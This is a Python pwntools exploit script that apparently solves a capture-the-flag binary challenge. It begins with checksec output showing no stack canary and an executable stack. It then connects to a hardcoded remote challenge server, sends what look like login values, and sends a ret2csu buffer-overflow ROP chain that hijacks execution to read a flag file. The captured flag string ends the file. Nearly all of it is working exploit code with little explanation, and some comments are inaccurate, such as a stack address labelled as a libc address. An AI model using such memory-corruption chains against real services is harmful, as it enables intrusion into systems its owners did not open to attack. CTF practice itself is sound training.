# Arch:       amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWx:        Has RWX segments
# RUNPATH:    b'.'
# Stripped:   No

from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve(): 
    p = conn()
    if args.REMOTE:
        p.sendline(b"13523090")
        p.sendline(b"9")

    exe = './9'
    context.binary = ELF(exe, checksec=False)
    context.log_level = 'debug'
    
    # Attack goes here
    pop_rbp = 0x000000000040121d
    pop_rdi = 0x000000000040128e
    pop_rsi_pop_r15 = 0x000000000040128c
    win_addr = 0x00000000004014af
    offset = 232                            # offset = 224, offset + 8 = 232

    # ret2csu
    payload = flat([
        b"A" * offset, 
        p64(pop_rbp), p64(0x00007fffffffd990),          # server's libc address
        p64(pop_rdi), p64(0x4040f0),                    # fmt location
        p64(pop_rsi_pop_r15), p64(0x402071), p64(3),    # read location, params = 3 (read 9.flag.txt)
        p64(win_addr + 68),                             # jump to fopen
    ])

    p.sendline(payload)
    p.interactive()

solve()

# Orkom3{Let's play hide and seek._e4df42532de3008e}